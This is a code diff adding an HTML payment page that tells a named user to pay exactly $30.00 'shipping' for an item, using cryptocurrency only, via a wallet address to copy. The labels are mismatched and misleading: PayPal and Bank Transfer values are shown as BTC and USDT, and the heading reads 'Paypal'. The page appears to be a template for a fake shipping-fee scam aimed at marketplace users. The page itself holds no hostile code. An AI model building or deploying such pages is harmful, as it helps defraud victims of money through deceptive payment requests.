@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>
+        INFORMATION 
+    </title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="css/payment.css">
+    <link rel="stylesheet" href="css/loading.css">
+    <link rel="icon" href="img/logo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Alumni+Sans+SC:ital,wght@0,100..900;1,100..900&family=Edu+NSW+ACT+Cursive:wght@400..700&family=Mulish:ital,wght@0,200..1000;1,200..1000&family=PT+Serif:ital,wght@0,400;0,700;1,400;1,700&family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
+</head>
+<body> 
+    <div class="loading">
+        <div class="spinner"></div>
+    </div>
+    
+    <section>
+        <div class="payout-box">
+            <h2>Payment</h2>
+            <label for="method">Payout Method</label>
+            <select id="method" required>
+                <option value="">Select method</option>
+                <option value="Bank Transfer">BTC</option>
+                <option value="PayPal">USDT-TRC20</option>
+                <option value="Crypto">ETH (ERC20)</option>
+                <option value="Cashapp">SOL</option>
+            </select>
+
+            <div class="success" id="bookings-container">
+                Dear <b><span id="user"></span></b> you are to pay exactly <b>$30.00</b> for shipping
+                 of item <b><span id="item"></span></b> to your location.
+            </div>
+        </div>
+
+        <div class="payment-box">
+            <h2 id="head">Paypal</h2>
+            <div class="center">
+                <div>
+                    <img id="img" src="" width="100%">
+                </div>
+
+                <div class="wallet" id="wallet">
+
+                </div><br>
+                <div>
+                    <button id="bi-copy">
+                        Click to copy address
+                    </button>
+                </div>
+            </div>
+            <button type="submit" id="btn">
+                I've made my payment
+            </button>
+
+            <div style="margin: 10px 0px; text-align: center; font-size: 12px;">
+                I have my screenshot of payment
+            </div>
+        </div>
+    </section>
+
+    <script src="js/payment2.js"></script>
+</body>
+</html>
